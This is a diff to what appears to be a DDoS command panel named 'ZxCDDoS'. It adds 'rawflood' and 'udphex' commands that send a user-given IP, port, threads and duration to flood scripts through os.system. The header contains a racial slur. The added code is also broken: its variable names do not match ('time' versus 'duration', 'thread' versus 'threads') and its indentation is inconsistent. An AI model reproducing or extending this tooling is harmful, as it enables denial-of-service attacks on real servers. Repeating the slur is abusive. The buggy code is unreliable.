@@ -1,4 +1,4 @@
-##############################
+i##############################
 # ZxCDDoS Made by zxcr9999   #
 # COPY = NIGGER              #
 ##############################
@@ -126,7 +126,7 @@ def rules():
                 \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel  NOTE MONEYMATCHH MADE ALL THIS                     \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                 \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
@@ -335,7 +335,29 @@ def main():
             except IndexError:
                 print('Usage: home <ip> <port> <packet_size> <time>')
                 print('Example: home 1.1.1.1 80 65500 60')
+        
+         elif "rawflood" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'python3 rawflood.py {ip} {port} {duration}')
+            except IndexError:
+                print('Usage: rawflood <ip> <port> <duration>')
+                print('Example: rawflood 1.1.1.1 80 60')
 
+        
+        elif "udphex" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'python3 udphex.py {ip} {port} {threads} {time} 0 0')
+            except IndexError:
+                print('Usage: udphex <ip> <port> <threads> <time>')
+                print('Example: udphex 1.1.1.1 80 300 7500')
+        
         elif "udp" in cnc:
             try:
                 ip = cnc.split()[1]
